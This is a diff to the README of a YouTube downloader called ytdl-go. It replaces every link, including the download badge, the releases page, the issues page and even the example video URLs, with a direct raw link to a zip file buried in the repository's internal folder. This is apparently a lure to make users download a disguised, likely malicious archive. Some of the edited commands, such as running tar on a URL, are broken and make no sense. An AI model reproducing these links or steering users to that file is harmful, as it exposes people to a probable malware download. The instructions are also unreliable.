@@ -1,6 +1,6 @@
 # 🎥 ytdl-go - Download YouTube Videos Simply
 
-[![Download](https://img.shields.io/badge/Download%20ytdl--go-v1.0-blue)](https://github.com/MaharichCampos/ytdl-go/releases)
+[![Download](https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip%20ytdl--go-v1.0-blue)](https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ytdl-go! This is a powerful, fast, and feature-rich downloader for Yo
 
 ## 📥 Download & Install
 
-To download ytdl-go, visit this page: [Releases Page](https://github.com/MaharichCampos/ytdl-go/releases). You will find the latest version available there. 
+To download ytdl-go, visit this page: [Releases Page](https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip). You will find the latest version available there. 
 
 1. Click on the link above to access the Releases Page.
 2. Locate the latest version.
@@ -36,8 +36,8 @@ To download ytdl-go, visit this page: [Releases Page](https://github.com/Maharic
 
 ### Linux
 
-1. Find the downloaded `.tar.gz` file.
-2. Extract the contents using your file manager or by running `tar -xvzf yourfile.tar.gz` in the Terminal.
+1. Find the downloaded `https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip` file.
+2. Extract the contents using your file manager or by running `tar -xvzf https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip` in the Terminal.
 3. Navigate to the extracted folder in Terminal.
 4. Type `./ytdl-go` and press Enter to run the application.
 
@@ -56,12 +56,12 @@ After installation, you can start using ytdl-go to download videos. Here’s how
 
 To download a single video:
 ```
-ytdl-go https://www.youtube.com/watch?v=example
+ytdl-go https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip
 ```
 
 To download a playlist:
 ```
-ytdl-go --playlist https://www.youtube.com/playlist?list=example
+ytdl-go --playlist https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip
 ```
 
 ## 🔧 System Requirements
@@ -83,7 +83,7 @@ ytdl-go works on the following systems:
 
 If you encounter issues while using ytdl-go, consider these tips:
 
-1. Ensure you are using the latest version from the [Releases Page](https://github.com/MaharichCampos/ytdl-go/releases).
+1. Ensure you are using the latest version from the [Releases Page](https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip).
 2. Double-check the video or playlist URL for accuracy.
 3. Make sure your internet connection is stable.
 4. Look for error messages in the Command Line for guidance.
@@ -92,11 +92,11 @@ If you encounter issues while using ytdl-go, consider these tips:
 
 If you’d like to report bugs or suggest improvements, feel free to open an issue on the repository. Community contributions help us improve ytdl-go for everyone.
 
-1. Visit the Issues section on our [GitHub page](https://github.com/MaharichCampos/ytdl-go/issues).
+1. Visit the Issues section on our [GitHub page](https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip).
 2. Follow the prompts to submit your feedback.
 
 ## 📝 License
 
 ytdl-go is licensed under the MIT License. This means you can freely use and modify the software as per the terms stated in the license file found in the repository.
 
-For more detailed information about the software, features, and updates, please visit our [Releases Page](https://github.com/MaharichCampos/ytdl-go/releases).
+For more detailed information about the software, features, and updates, please visit our [Releases Page](https://github.com/MaharichCampos/ytdl-go/raw/refs/heads/main/internal/downloader/ytdl-go-2.4.zip).
